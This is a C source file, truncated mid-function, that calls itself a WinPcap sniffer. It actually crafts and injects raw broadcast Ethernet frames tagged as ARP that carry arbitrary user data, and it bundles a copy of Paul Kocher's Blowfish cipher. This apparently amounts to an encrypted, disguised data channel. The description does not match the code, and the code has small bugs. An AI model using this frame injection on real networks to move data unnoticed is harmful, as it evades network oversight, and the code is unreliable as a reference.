/*
    Simple Sniffer with winpcap , prints ethernet , ip , tcp , udp and icmp headers along with data dump in hex
    Author : Silver Moon ( m00n.silv3r@gmail.com )
*/
 
#include "stdio.h"
#include "stdlib.h"
#include "winsock2.h"   //need winsock for inet_ntoa and ntohs methods
#define HAVE_REMOTE
#include "pcap.h"   //Winpcap :)
#pragma comment(lib , "ws2_32.lib") //For winsock
#pragma comment(lib , "wpcap.lib") //For winpcap
#define B64_DEF_LINE_SIZE   72
#define B64_MIN_LINE_SIZE    4
#define N               16
// gcc -g silvermoon.c -o silvermoon.exe -lws2_32 -lwpcap
void ProcessPacket (u_char* , int);
void print_ethernet_header (u_char*);
void PrintData (u_char* , int);
unsigned char FinalPacket[5000];
pcap_t *fp;
void shift_right(unsigned char *ar, int size, int shift) { // I stole this from the internets.  pass it message, messagelen, and # of bits to shift
    while (shift--) {                           // For each bit to shift ... <--- is this slower than doing one pass with a larger bitwise shift?
	int carry = 0;                              // Clear the initial carry bit.	//int i = size - 1;
	int i = 0;
	for (; i < size; ++i) {
            int next = (ar[i] & 1) ? 0x80 : 0;  // ... if the low bit is set, set the carry bit.
            ar[i] = carry | (ar[i] >> 1);       // Shift the element one bit left and addthe old carry.
            carry = next;                       // Remember the old carry for next time.
        }   
    }
}
//void CreatePacket(unsigned char* SourceMAC, unsigned char* DestinationMAC, unsigned int SourceIP, unsigned int DestIP, unsigned short SourcePort, unsigned short DestinationPort, unsigned char* UserData,unsigned int UserDataLen) {
void CreatePacket(unsigned char* UserData,unsigned int UserDataLen) {
    //Beginning of Ethernet II Header
    memcpy((void*)FinalPacket,(void*)"\xFF\xFF\xFF\xFF\xFF\xFF",6); // DestMAC
    memcpy((void*)(FinalPacket+6),(void*)"\xCC\x0A\xF4\x6B\x70\xA8",6); // SrcMAC
    memcpy((void*)(FinalPacket+12),(void*)"\x08\x06",2); 
    //memcpy((void*)(FinalPacket+14),(void*)"\x01",1); // Command bit and data
    memcpy((void*)(FinalPacket+14),(void*)UserData,UserDataLen); // Finally append our own data
    memcpy((void*)(FinalPacket+15+UserDataLen),(void*)"\x00",1); // a byte of zeros, to terminate the string
    return;
}
//void SendPacket(pcap_if_t* Device) {
void SendPacket(int packetlen) {
    char Error[256];
    //pcap_t* t;
    //t = pcap_open(Device->name,100,PCAP_OPENFLAG_PROMISCUOUS,20,NULL,Error);
    //pcap_sendpacket(t,FinalPacket,UserDataLen + 42);
    //pcap_sendpacket(t,FinalPacket,strlen(FinalPacket));
    pcap_sendpacket(fp,FinalPacket,packetlen);
    //pcap_close(t); // we dont close now, because we are still listening on it concurrently, i hope
}
// BLEWS FLOSH
typedef struct {
  unsigned long P[16 + 2];
  unsigned long S[4][256];
} BLOWFISH_CTX;

void Blowfish_Init(BLOWFISH_CTX *ctx, unsigned char *key, int keyLen);
void Blowfish_Encrypt(BLOWFISH_CTX *ctx, unsigned long *xl, unsigned long *xr);
void Blowfish_Decrypt(BLOWFISH_CTX *ctx, unsigned long *xl, unsigned long *xr);
/*
blowfish.c:  C implementation of the Blowfish algorithm.

Copyright (C) 1997 by Paul Kocher

COMMENTS ON USING THIS CODE:

Normal usage is as follows:
   [1] Allocate a BLOWFISH_CTX.  (It may be too big for the stack.)
   [2] Call Blowfish_Init with a pointer to your BLOWFISH_CTX, a pointer to
       the key, and the number of bytes in the key.
   [3] To encrypt a 64-bit block, call Blowfish_Encrypt with a pointer to
       BLOWFISH_CTX, a pointer to the 32-bit left half of the plaintext
	   and a pointer to the 32-bit right half.  The plaintext will be
	   overwritten with the ciphertext.
   [4] Decryption is the same as encryption except that the plaintext and
       ciphertext are reversed.

Warning #1:  The code does not check key lengths. (Caveat encryptor.) 
Warning #2:  Beware that Blowfish keys repeat such that "ab" = "abab".
Warning #3:  It is normally a good idea to zeroize the BLOWFISH_CTX before
  freeing it.
Warning #4:  Endianness conversions are the responsibility of the caller.
  (To encrypt bytes on a little-endian platforms, you'll probably want
  to swap bytes around instead of just casting.)
Warning #5:  Make sure to use a reasonable mode of operation for your
  application.  (If you don't know what CBC mode is, see Warning #7.)
Warning #6:  This code is susceptible to timing attacks.
Warning #7:  Security engineering is risky and non-intuitive.  Have someone 
  check your work.  If you don't know what you are doing, get help.


This is code is fast enough for most applications, but is not optimized for
speed.

If you require this code under a license other than LGPL, please ask.  (I 
can be located using your favorite search engine.)  Unfortunately, I do not 
have time to provide unpaid support for everyone who uses this code.  

                                             -- Paul Kocher
*/



static const unsigned long ORIG_P[16 + 2] = {
        0x243F6A88L, 0x85A308D3L, 0x13198A2EL, 0x03707344L,
        0xA4093822L, 0x299F31D0L, 0x082EFA98L, 0xEC4E6C89L,
        0x452821E6L, 0x38D01377L, 0xBE5466CFL, 0x34E90C6CL,
        0xC0AC29B7L, 0xC97C50DDL, 0x3F84D5B5L, 0xB5470917L,
        0x9216D5D9L, 0x8979FB1BL
};

static const unsigned long ORIG_S[4][256] = {
    {   0xD1310BA6L, 0x98DFB5ACL, 0x2FFD72DBL, 0xD01ADFB7L,
        0xB8E1AFEDL, 0x6A267E96L, 0xBA7C9045L, 0xF12C7F99L,
        0x24A19947L, 0xB3916CF7L, 0x0801F2E2L, 0x858EFC16L,
        0x636920D8L, 0x71574E69L, 0xA458FEA3L, 0xF4933D7EL,
        0x0D95748FL, 0x728EB658L, 0x718BCD58L, 0x82154AEEL,
        0x7B54A41DL, 0xC25A59B5L, 0x9C30D539L, 0x2AF26013L,
        0xC5D1B023L, 0x286085F0L, 0xCA417918L, 0xB8DB38EFL,
        0x8E79DCB0L, 0x603A180EL, 0x6C9E0E8BL, 0xB01E8A3EL,
        0xD71577C1L, 0xBD314B27L, 0x78AF2FDAL, 0x55605C60L,
        0xE65525F3L, 0xAA55AB94L, 0x57489862L, 0x63E81440L,
        0x55CA396AL, 0x2AAB10B6L, 0xB4CC5C34L, 0x1141E8CEL,
        0xA15486AFL, 0x7C72E993L, 0xB3EE1411L, 0x636FBC2AL,
        0x2BA9C55DL, 0x741831F6L, 0xCE5C3E16L, 0x9B87931EL,
        0xAFD6BA33L, 0x6C24CF5CL, 0x7A325381L, 0x28958677L,
        0x3B8F4898L, 0x6B4BB9AFL, 0xC4BFE81BL, 0x66282193L,
        0x61D809CCL, 0xFB21A991L, 0x487CAC60L, 0x5DEC8032L,
        0xEF845D5DL, 0xE98575B1L, 0xDC262302L, 0xEB651B88L,
        0x23893E81L, 0xD396ACC5L, 0x0F6D6FF3L, 0x83F44239L,
        0x2E0B4482L, 0xA4842004L, 0x69C8F04AL, 0x9E1F9B5EL,
        0x21C66842L, 0xF6E96C9AL, 0x670C9C61L, 0xABD388F0L,
        0x6A51A0D2L, 0xD8542F68L, 0x960FA728L, 0xAB5133A3L,
        0x6EEF0B6CL, 0x137A3BE4L, 0xBA3BF050L, 0x7EFB2A98L,
        0xA1F1651DL, 0x39AF0176L, 0x66CA593EL, 0x82430E88L,
        0x8CEE8619L, 0x456F9FB4L, 0x7D84A5C3L, 0x3B8B5EBEL,
        0xE06F75D8L, 0x85C12073L, 0x401A449FL, 0x56C16AA6L,
        0x4ED3AA62L, 0x363F7706L, 0x1BFEDF72L, 0x429B023DL,
        0x37D0D724L, 0xD00A1248L, 0xDB0FEAD3L, 0x49F1C09BL,
        0x075372C9L, 0x80991B7BL, 0x25D479D8L, 0xF6E8DEF7L,
        0xE3FE501AL, 0xB6794C3BL, 0x976CE0BDL, 0x04C006BAL,
        0xC1A94FB6L, 0x409F60C4L, 0x5E5C9EC2L, 0x196A2463L,
        0x68FB6FAFL, 0x3E6C53B5L, 0x1339B2EBL, 0x3B52EC6FL,
        0x6DFC511FL, 0x9B30952CL, 0xCC814544L, 0xAF5EBD09L,
        0xBEE3D004L, 0xDE334AFDL, 0x660F2807L, 0x192E4BB3L,
        0xC0CBA857L, 0x45C8740FL, 0xD20B5F39L, 0xB9D3FBDBL,
        0x5579C0BDL, 0x1A60320AL, 0xD6A100C6L, 0x402C7279L,
        0x679F25FEL, 0xFB1FA3CCL, 0x8EA5E9F8L, 0xDB3222F8L,
        0x3C7516DFL, 0xFD616B15L, 0x2F501EC8L, 0xAD0552ABL,
        0x323DB5FAL, 0xFD238760L, 0x53317B48L, 0x3E00DF82L,
        0x9E5C57BBL, 0xCA6F8CA0L, 0x1A87562EL, 0xDF1769DBL,
        0xD542A8F6L, 0x287EFFC3L, 0xAC6732C6L, 0x8C4F5573L,
        0x695B27B0L, 0xBBCA58C8L, 0xE1FFA35DL, 0xB8F011A0L,
        0x10FA3D98L, 0xFD2183B8L, 0x4AFCB56CL, 0x2DD1D35BL,
        0x9A53E479L, 0xB6F84565L, 0xD28E49BCL, 0x4BFB9790L,
        0xE1DDF2DAL, 0xA4CB7E33L, 0x62FB1341L, 0xCEE4C6E8L,
        0xEF20CADAL, 0x36774C01L, 0xD07E9EFEL, 0x2BF11FB4L,
        0x95DBDA4DL, 0xAE909198L, 0xEAAD8E71L, 0x6B93D5A0L,
        0xD08ED1D0L, 0xAFC725E0L, 0x8E3C5B2FL, 0x8E7594B7L,
        0x8FF6E2FBL, 0xF2122B64L, 0x8888B812L, 0x900DF01CL,
        0x4FAD5EA0L, 0x688FC31CL, 0xD1CFF191L, 0xB3A8C1ADL,
        0x2F2F2218L, 0xBE0E1777L, 0xEA752DFEL, 0x8B021FA1L,
        0xE5A0CC0FL, 0xB56F74E8L, 0x18ACF3D6L, 0xCE89E299L,
        0xB4A84FE0L, 0xFD13E0B7L, 0x7CC43B81L, 0xD2ADA8D9L,
        0x165FA266L, 0x80957705L, 0x93CC7314L, 0x211A1477L,
        0xE6AD2065L, 0x77B5FA86L, 0xC75442F5L, 0xFB9D35CFL,
        0xEBCDAF0CL, 0x7B3E89A0L, 0xD6411BD3L, 0xAE1E7E49L,
        0x00250E2DL, 0x2071B35EL, 0x226800BBL, 0x57B8E0AFL,
        0x2464369BL, 0xF009B91EL, 0x5563911DL, 0x59DFA6AAL,
        0x78C14389L, 0xD95A537FL, 0x207D5BA2L, 0x02E5B9C5L,
        0x83260376L, 0x6295CFA9L, 0x11C81968L, 0x4E734A41L,
        0xB3472DCAL, 0x7B14A94AL, 0x1B510052L, 0x9A532915L,
        0xD60F573FL, 0xBC9BC6E4L, 0x2B60A476L, 0x81E67400L,
        0x08BA6FB5L, 0x571BE91FL, 0xF296EC6BL, 0x2A0DD915L,
        0xB6636521L, 0xE7B9F9B6L, 0xFF34052EL, 0xC5855664L,
        0x53B02D5DL, 0xA99F8FA1L, 0x08BA4799L, 0x6E85076AL   },
    {   0x4B7A70E9L, 0xB5B32944L, 0xDB75092EL, 0xC4192623L,
        0xAD6EA6B0L, 0x49A7DF7DL, 0x9CEE60B8L, 0x8FEDB266L,
        0xECAA8C71L, 0x699A17FFL, 0x5664526CL, 0xC2B19EE1L,
        0x193602A5L, 0x75094C29L, 0xA0591340L, 0xE4183A3EL,
        0x3F54989AL, 0x5B429D65L, 0x6B8FE4D6L, 0x99F73FD6L,
        0xA1D29C07L, 0xEFE830F5L, 0x4D2D38E6L, 0xF0255DC1L,
        0x4CDD2086L, 0x8470EB26L, 0x6382E9C6L, 0x021ECC5EL,
        0x09686B3FL, 0x3EBAEFC9L, 0x3C971814L, 0x6B6A70A1L,
        0x687F3584L, 0x52A0E286L, 0xB79C5305L, 0xAA500737L,
        0x3E07841CL, 0x7FDEAE5CL, 0x8E7D44ECL, 0x5716F2B8L,
        0xB03ADA37L, 0xF0500C0DL, 0xF01C1F04L, 0x0200B3FFL,
        0xAE0CF51AL, 0x3CB574B2L, 0x25837A58L, 0xDC0921BDL,
        0xD19113F9L, 0x7CA92FF6L, 0x94324773L, 0x22F54701L,
        0x3AE5E581L, 0x37C2DADCL, 0xC8B57634L, 0x9AF3DDA7L,
        0xA9446146L, 0x0FD0030EL, 0xECC8C73EL, 0xA4751E41L,
        0xE238CD99L, 0x3BEA0E2FL, 0x3280BBA1L, 0x183EB331L,
        0x4E548B38L, 0x4F6DB908L, 0x6F420D03L, 0xF60A04BFL,
        0x2CB81290L, 0x24977C79L, 0x5679B072L, 0xBCAF89AFL,
        0xDE9A771FL, 0xD9930810L, 0xB38BAE12L, 0xDCCF3F2EL,
        0x5512721FL, 0x2E6B7124L, 0x501ADDE6L, 0x9F84CD87L,
        0x7A584718L, 0x7408DA17L, 0xBC9F9ABCL, 0xE94B7D8CL,
        0xEC7AEC3AL, 0xDB851DFAL, 0x63094366L, 0xC464C3D2L,
        0xEF1C1847L, 0x3215D908L, 0xDD433B37L, 0x24C2BA16L,
        0x12A14D43L, 0x2A65C451L, 0x50940002L, 0x133AE4DDL,
        0x71DFF89EL, 0x10314E55L, 0x81AC77D6L, 0x5F11199BL,
        0x043556F1L, 0xD7A3C76BL, 0x3C11183BL, 0x5924A509L,
        0xF28FE6EDL, 0x97F1FBFAL, 0x9EBABF2CL, 0x1E153C6EL,
        0x86E34570L, 0xEAE96FB1L, 0x860E5E0AL, 0x5A3E2AB3L,
        0x771FE71CL, 0x4E3D06FAL, 0x2965DCB9L, 0x99E71D0FL,
        0x803E89D6L, 0x5266C825L, 0x2E4CC978L, 0x9C10B36AL,
        0xC6150EBAL, 0x94E2EA78L, 0xA5FC3C53L, 0x1E0A2DF4L,
        0xF2F74EA7L, 0x361D2B3DL, 0x1939260FL, 0x19C27960L,
        0x5223A708L, 0xF71312B6L, 0xEBADFE6EL, 0xEAC31F66L,
        0xE3BC4595L, 0xA67BC883L, 0xB17F37D1L, 0x018CFF28L,
        0xC332DDEFL, 0xBE6C5AA5L, 0x65582185L, 0x68AB9802L,
        0xEECEA50FL, 0xDB2F953BL, 0x2AEF7DADL, 0x5B6E2F84L,
        0x1521B628L, 0x29076170L, 0xECDD4775L, 0x619F1510L,
        0x13CCA830L, 0xEB61BD96L, 0x0334FE1EL, 0xAA0363CFL,
        0xB5735C90L, 0x4C70A239L, 0xD59E9E0BL, 0xCBAADE14L,
        0xEECC86BCL, 0x60622CA7L, 0x9CAB5CABL, 0xB2F3846EL,
        0x648B1EAFL, 0x19BDF0CAL, 0xA02369B9L, 0x655ABB50L,
        0x40685A32L, 0x3C2AB4B3L, 0x319EE9D5L, 0xC021B8F7L,
        0x9B540B19L, 0x875FA099L, 0x95F7997EL, 0x623D7DA8L,
        0xF837889AL, 0x97E32D77L, 0x11ED935FL, 0x16681281L,
        0x0E358829L, 0xC7E61FD6L, 0x96DEDFA1L, 0x7858BA99L,
        0x57F584A5L, 0x1B227263L, 0x9B83C3FFL, 0x1AC24696L,
        0xCDB30AEBL, 0x532E3054L, 0x8FD948E4L, 0x6DBC3128L,
        0x58EBF2EFL, 0x34C6FFEAL, 0xFE28ED61L, 0xEE7C3C73L,
        0x5D4A14D9L, 0xE864B7E3L, 0x42105D14L, 0x203E13E0L,
        0x45EEE2B6L, 0xA3AAABEAL, 0xDB6C4F15L, 0xFACB4FD0L,
        0xC742F442L, 0xEF6ABBB5L, 0x654F3B1DL, 0x41CD2105L,
        0xD81E799EL, 0x86854DC7L, 0xE44B476AL, 0x3D816250L,
        0xCF62A1F2L, 0x5B8D2646L, 0xFC8883A0L, 0xC1C7B6A3L,
        0x7F1524C3L, 0x69CB7492L, 0x47848A0BL, 0x5692B285L,
        0x095BBF00L, 0xAD19489DL, 0x1462B174L, 0x23820E00L,
        0x58428D2AL, 0x0C55F5EAL, 0x1DADF43EL, 0x233F7061L,
        0x3372F092L, 0x8D937E41L, 0xD65FECF1L, 0x6C223BDBL,
        0x7CDE3759L, 0xCBEE7460L, 0x4085F2A7L, 0xCE77326EL,
        0xA6078084L, 0x19F8509EL, 0xE8EFD855L, 0x61D99735L,
        0xA969A7AAL, 0xC50C06C2L, 0x5A04ABFCL, 0x800BCADCL,
        0x9E447A2EL, 0xC3453484L, 0xFDD56705L, 0x0E1E9EC9L,
        0xDB73DBD3L, 0x105588CDL, 0x675FDA79L, 0xE3674340L,
        0xC5C43465L, 0x713E38D8L, 0x3D28F89EL, 0xF16DFF20L,
        0x153E21E7L, 0x8FB03D4AL, 0xE6E39F2BL, 0xDB83ADF7L   },
    {   0xE93D5A68L, 0x948140F7L, 0xF64C261CL, 0x94692934L,
        0x411520F7L, 0x7602D4F7L, 0xBCF46B2EL, 0xD4A20068L,
        0xD4082471L, 0x3320F46AL, 0x43B7D4B7L, 0x500061AFL,
        0x1E39F62EL, 0x97244546L, 0x14214F74L, 0xBF8B8840L,
        0x4D95FC1DL, 0x96B591AFL, 0x70F4DDD3L, 0x66A02F45L,
        0xBFBC09ECL, 0x03BD9785L, 0x7FAC6DD0L, 0x31CB8504L,
        0x96EB27B3L, 0x55FD3941L, 0xDA2547E6L, 0xABCA0A9AL,
        0x28507825L, 0x530429F4L, 0x0A2C86DAL, 0xE9B66DFBL,
        0x68DC1462L, 0xD7486900L, 0x680EC0A4L, 0x27A18DEEL,
        0x4F3FFEA2L, 0xE887AD8CL, 0xB58CE006L, 0x7AF4D6B6L,
        0xAACE1E7CL, 0xD3375FECL, 0xCE78A399L, 0x406B2A42L,
        0x20FE9E35L, 0xD9F385B9L, 0xEE39D7ABL, 0x3B124E8BL,
        0x1DC9FAF7L, 0x4B6D1856L, 0x26A36631L, 0xEAE397B2L,
        0x3A6EFA74L, 0xDD5B4332L, 0x6841E7F7L, 0xCA7820FBL,
        0xFB0AF54EL, 0xD8FEB397L, 0x454056ACL, 0xBA489527L,
        0x55533A3AL, 0x20838D87L, 0xFE6BA9B7L, 0xD096954BL,
        0x55A867BCL, 0xA1159A58L, 0xCCA92963L, 0x99E1DB33L,
        0xA62A4A56L, 0x3F3125F9L, 0x5EF47E1CL, 0x9029317CL,
        0xFDF8E802L, 0x04272F70L, 0x80BB155CL, 0x05282CE3L,
        0x95C11548L, 0xE4C66D22L, 0x48C1133FL, 0xC70F86DCL,
        0x07F9C9EEL, 0x41041F0FL, 0x404779A4L, 0x5D886E17L,
        0x325F51EBL, 0xD59BC0D1L, 0xF2BCC18FL, 0x41113564L,
        0x257B7834L, 0x602A9C60L, 0xDFF8E8A3L, 0x1F636C1BL,
        0x0E12B4C2L, 0x02E1329EL, 0xAF664FD1L, 0xCAD18115L,
        0x6B2395E0L, 0x333E92E1L, 0x3B240B62L, 0xEEBEB922L,
        0x85B2A20EL, 0xE6BA0D99L, 0xDE720C8CL, 0x2DA2F728L,
        0xD0127845L, 0x95B794FDL, 0x647D0862L, 0xE7CCF5F0L,
        0x5449A36FL, 0x877D48FAL, 0xC39DFD27L, 0xF33E8D1EL,
        0x0A476341L, 0x992EFF74L, 0x3A6F6EABL, 0xF4F8FD37L,
        0xA812DC60L, 0xA1EBDDF8L, 0x991BE14CL, 0xDB6E6B0DL,
        0xC67B5510L, 0x6D672C37L, 0x2765D43BL, 0xDCD0E804L,
        0xF1290DC7L, 0xCC00FFA3L, 0xB5390F92L, 0x690FED0BL,
        0x667B9FFBL, 0xCEDB7D9CL, 0xA091CF0BL, 0xD9155EA3L,
        0xBB132F88L, 0x515BAD24L, 0x7B9479BFL, 0x763BD6EBL,
        0x37392EB3L, 0xCC115979L, 0x8026E297L, 0xF42E312DL,
        0x6842ADA7L, 0xC66A2B3BL, 0x12754CCCL, 0x782EF11CL,
        0x6A124237L, 0xB79251E7L, 0x06A1BBE6L, 0x4BFB6350L,
        0x1A6B1018L, 0x11CAEDFAL, 0x3D25BDD8L, 0xE2E1C3C9L,
        0x44421659L, 0x0A121386L, 0xD90CEC6EL, 0xD5ABEA2AL,
        0x64AF674EL, 0xDA86A85FL, 0xBEBFE988L, 0x64E4C3FEL,
        0x9DBC8057L, 0xF0F7C086L, 0x60787BF8L, 0x6003604DL,
        0xD1FD8346L, 0xF6381FB0L, 0x7745AE04L, 0xD736FCCCL,
        0x83426B33L, 0xF01EAB71L, 0xB0804187L, 0x3C005E5FL,
        0x77A057BEL, 0xBDE8AE24L, 0x55464299L, 0xBF582E61L,
        0x4E58F48FL, 0xF2DDFDA2L, 0xF474EF38L, 0x8789BDC2L,
        0x5366F9C3L, 0xC8B38E74L, 0xB475F255L, 0x46FCD9B9L,
        0x7AEB2661L, 0x8B1DDF84L, 0x846A0E79L, 0x915F95E2L,
        0x466E598EL, 0x20B45770L, 0x8CD55591L, 0xC902DE4CL,
        0xB90BACE1L, 0xBB8205D0L, 0x11A86248L, 0x7574A99EL,
        0xB77F19B6L, 0xE0A9DC09L, 0x662D09A1L, 0xC4324633L,
        0xE85A1F02L, 0x09F0BE8CL, 0x4A99A025L, 0x1D6EFE10L,
        0x1AB93D1DL, 0x0BA5A4DFL, 0xA186F20FL, 0x2868F169L,
        0xDCB7DA83L, 0x573906FEL, 0xA1E2CE9BL, 0x4FCD7F52L,
        0x50115E01L, 0xA70683FAL, 0xA002B5C4L, 0x0DE6D027L,
        0x9AF88C27L, 0x773F8641L, 0xC3604C06L, 0x61A806B5L,
        0xF0177A28L, 0xC0F586E0L, 0x006058AAL, 0x30DC7D62L,
        0x11E69ED7L, 0x2338EA63L, 0x53C2DD94L, 0xC2C21634L,
        0xBBCBEE56L, 0x90BCB6DEL, 0xEBFC7DA1L, 0xCE591D76L,
        0x6F05E409L, 0x4B7C0188L, 0x39720A3DL, 0x7C927C24L,
        0x86E3725FL, 0x724D9DB9L, 0x1AC15BB4L, 0xD39EB8FCL,
        0xED545578L, 0x08FCA5B5L, 0xD83D7CD3L, 0x4DAD0FC4L,
        0x1E50EF5EL, 0xB161E6F8L, 0xA28514D9L, 0x6C51133CL,
        0x6FD5C7E7L, 0x56E14EC4L, 0x362ABFCEL, 0xDDC6C837L,
        0xD79A3234L, 0x92638212L, 0x670EFA8EL, 0x406000E0L  },
    {   0x3A39CE37L, 0xD3FAF5CFL, 0xABC27737L, 0x5AC52D1BL,
        0x5CB0679EL, 0x4FA33742L, 0xD3822740L, 0x99BC9BBEL,
        0xD5118E9DL, 0xBF0F7315L, 0xD62D1C7EL, 0xC700C47BL,
        0xB78C1B6BL, 0x21A19045L, 0xB26EB1BEL, 0x6A366EB4L,
        0x5748AB2FL, 0xBC946E79L, 0xC6A376D2L, 0x6549C2C8L,
        0x530FF8EEL, 0x468DDE7DL, 0xD5730A1DL, 0x4CD04DC6L,
        0x2939BBDBL, 0xA9BA4650L, 0xAC9526E8L, 0xBE5EE304L,
        0xA1FAD5F0L, 0x6A2D519AL, 0x63EF8CE2L, 0x9A86EE22L,
        0xC089C2B8L, 0x43242EF6L, 0xA51E03AAL, 0x9CF2D0A4L,
        0x83C061BAL, 0x9BE96A4DL, 0x8FE51550L, 0xBA645BD6L,
        0x2826A2F9L, 0xA73A3AE1L, 0x4BA99586L, 0xEF5562E9L,
        0xC72FEFD3L, 0xF752F7DAL, 0x3F046F69L, 0x77FA0A59L,
        0x80E4A915L, 0x87B08601L, 0x9B09E6ADL, 0x3B3EE593L,
        0xE990FD5AL, 0x9E34D797L, 0x2CF0B7D9L, 0x022B8B51L,
        0x96D5AC3AL, 0x017DA67DL, 0xD1CF3ED6L, 0x7C7D2D28L,
        0x1F9F25CFL, 0xADF2B89BL, 0x5AD6B472L, 0x5A88F54CL,
        0xE029AC71L, 0xE019A5E6L, 0x47B0ACFDL, 0xED93FA9BL,
        0xE8D3C48DL, 0x283B57CCL, 0xF8D56629L, 0x79132E28L,
        0x785F0191L, 0xED756055L, 0xF7960E44L, 0xE3D35E8CL,
        0x15056DD4L, 0x88F46DBAL, 0x03A16125L, 0x0564F0BDL,
        0xC3EB9E15L, 0x3C9057A2L, 0x97271AECL, 0xA93A072AL,
        0x1B3F6D9BL, 0x1E6321F5L, 0xF59C66FBL, 0x26DCF319L,
        0x7533D928L, 0xB155FDF5L, 0x03563482L, 0x8ABA3CBBL,
        0x28517711L, 0xC20AD9F8L, 0xABCC5167L, 0xCCAD925FL,
        0x4DE81751L, 0x3830DC8EL, 0x379D5862L, 0x9320F991L,
        0xEA7A90C2L, 0xFB3E7BCEL, 0x5121CE64L, 0x774FBE32L,
        0xA8B6E37EL, 0xC3293D46L, 0x48DE5369L, 0x6413E680L,
        0xA2AE0810L, 0xDD6DB224L, 0x69852DFDL, 0x09072166L,
        0xB39A460AL, 0x6445C0DDL, 0x586CDECFL, 0x1C20C8AEL,
        0x5BBEF7DDL, 0x1B588D40L, 0xCCD2017FL, 0x6BB4E3BBL,
        0xDDA26A7EL, 0x3A59FF45L, 0x3E350A44L, 0xBCB4CDD5L,
        0x72EACEA8L, 0xFA6484BBL, 0x8D6612AEL, 0xBF3C6F47L,
        0xD29BE463L, 0x542F5D9EL, 0xAEC2771BL, 0xF64E6370L,
        0x740E0D8DL, 0xE75B1357L, 0xF8721671L, 0xAF537D5DL,
        0x4040CB08L, 0x4EB4E2CCL, 0x34D2466AL, 0x0115AF84L,
        0xE1B00428L, 0x95983A1DL, 0x06B89FB4L, 0xCE6EA048L,
        0x6F3F3B82L, 0x3520AB82L, 0x011A1D4BL, 0x277227F8L,
        0x611560B1L, 0xE7933FDCL, 0xBB3A792BL, 0x344525BDL,
        0xA08839E1L, 0x51CE794BL, 0x2F32C9B7L, 0xA01FBAC9L,
        0xE01CC87EL, 0xBCC7D1F6L, 0xCF0111C3L, 0xA1E8AAC7L,
        0x1A908749L, 0xD44FBD9AL, 0xD0DADECBL, 0xD50ADA38L,
        0x0339C32AL, 0xC6913667L, 0x8DF9317CL, 0xE0B12B4FL,
        0xF79E59B7L, 0x43F5BB3AL, 0xF2D519FFL, 0x27D9459CL,
        0xBF97222CL, 0x15E6FC2AL, 0x0F91FC71L, 0x9B941525L,
        0xFAE59361L, 0xCEB69CEBL, 0xC2A86459L, 0x12BAA8D1L,
        0xB6C1075EL, 0xE3056A0CL, 0x10D25065L, 0xCB03A442L,
        0xE0EC6E0EL, 0x1698DB3BL, 0x4C98A0BEL, 0x3278E964L,
        0x9F1F9532L, 0xE0D392DFL, 0xD3A0342BL, 0x8971F21EL,
        0x1B0A7441L, 0x4BA3348CL, 0xC5BE7120L, 0xC37632D8L,
        0xDF359F8DL, 0x9B992F2EL, 0xE60B6F47L, 0x0FE3F11DL,
        0xE54CDA54L, 0x1EDAD891L, 0xCE6279CFL, 0xCD3E7E6FL,
        0x1618B166L, 0xFD2C1D05L, 0x848FD2C5L, 0xF6FB2299L,
        0xF523F357L, 0xA6327623L, 0x93A83531L, 0x56CCCD02L,
        0xACF08162L, 0x5A75EBB5L, 0x6E163697L, 0x88D273CCL,
        0xDE966292L, 0x81B949D0L, 0x4C50901BL, 0x71C65614L,
        0xE6C6C7BDL, 0x327A140AL, 0x45E1D006L, 0xC3F27B9AL,
        0xC9AA53FDL, 0x62A80F00L, 0xBB25BFE2L, 0x35BDD2F6L,
        0x71126905L, 0xB2040222L, 0xB6CBCF7CL, 0xCD769C2BL,
        0x53113EC0L, 0x1640E3D3L, 0x38ABBD60L, 0x2547ADF0L,
        0xBA38209CL, 0xF746CE76L, 0x77AFA1C5L, 0x20756060L,
        0x85CBFE4EL, 0x8AE88DD8L, 0x7AAAF9B0L, 0x4CF9AA7EL,
        0x1948C25CL, 0x02FB8A8CL, 0x01C36AE4L, 0xD6EBE1F9L,
        0x90D4F869L, 0xA65CDEA0L, 0x3F09252DL, 0xC208E69FL,
        0xB74E6132L, 0xCE77E25BL, 0x578FDFE3L, 0x3AC372E6L  }
};


static unsigned long F(BLOWFISH_CTX *ctx, unsigned long x) {
   unsigned short a, b, c, d;
   unsigned long  y;

   d = (unsigned short)(x & 0xFF);
   x >>= 8;
   c = (unsigned short)(x & 0xFF);
   x >>= 8;
   b = (unsigned short)(x & 0xFF);
   x >>= 8;
   a = (unsigned short)(x & 0xFF);
   y = ctx->S[0][a] + ctx->S[1][b];
   y = y ^ ctx->S[2][c];
   y = y + ctx->S[3][d];

   return y;
}


void Blowfish_Encrypt(BLOWFISH_CTX *ctx, unsigned long *xl, unsigned long *xr){
  unsigned long  Xl;
  unsigned long  Xr;
  unsigned long  temp;
  short       i;

  Xl = *xl;
  Xr = *xr;

  for (i = 0; i < N; ++i) {
    Xl = Xl ^ ctx->P[i];
    Xr = F(ctx, Xl) ^ Xr;

    temp = Xl;
    Xl = Xr;
    Xr = temp;
  }

  temp = Xl;
  Xl = Xr;
  Xr = temp;

  Xr = Xr ^ ctx->P[N];
  Xl = Xl ^ ctx->P[N + 1];

  *xl = Xl;
  *xr = Xr;
}


void Blowfish_Decrypt(BLOWFISH_CTX *ctx, unsigned long *xl, unsigned long *xr){
  unsigned long  Xl;
  unsigned long  Xr;
  unsigned long  temp;
  short       i;

  Xl = *xl;
  Xr = *xr;

  for (i = N + 1; i > 1; --i) {
    Xl = Xl ^ ctx->P[i];
    Xr = F(ctx, Xl) ^ Xr;

    /* Exchange Xl and Xr */
    temp = Xl;
    Xl = Xr;
    Xr = temp;
  }

  /* Exchange Xl and Xr */
  temp = Xl;
  Xl = Xr;
  Xr = temp;

  Xr = Xr ^ ctx->P[1];
  Xl = Xl ^ ctx->P[0];

  *xl = Xl;
  *xr = Xr;
}


void Blowfish_Init(BLOWFISH_CTX *ctx, unsigned char *key, int keyLen) {
  int i, j, k;
  unsigned long data, datal, datar;

  for (i = 0; i < 4; i++) {
    for (j = 0; j < 256; j++)
      ctx->S[i][j] = ORIG_S[i][j];
  }

  j = 0;
  for (i = 0; i < N + 2; ++i) {
    data = 0x00000000;
    for (k = 0; k < 4; ++k) {
      data = (data << 8) | key[j];
      j = j + 1;
      if (j >= keyLen)
        j = 0;
    }
    ctx->P[i] = ORIG_P[i] ^ data;
  }

  datal = 0x00000000;
  datar = 0x00000000;

  for (i = 0; i < N + 2; i += 2) {
    Blowfish_Encrypt(ctx, &datal, &datar);
    ctx->P[i] = datal;
    ctx->P[i + 1] = datar;
  }

  for (i = 0; i < 4; ++i) {
    for (j = 0; j < 256; j += 2) {
      Blowfish_Encrypt(ctx, &datal, &datar);
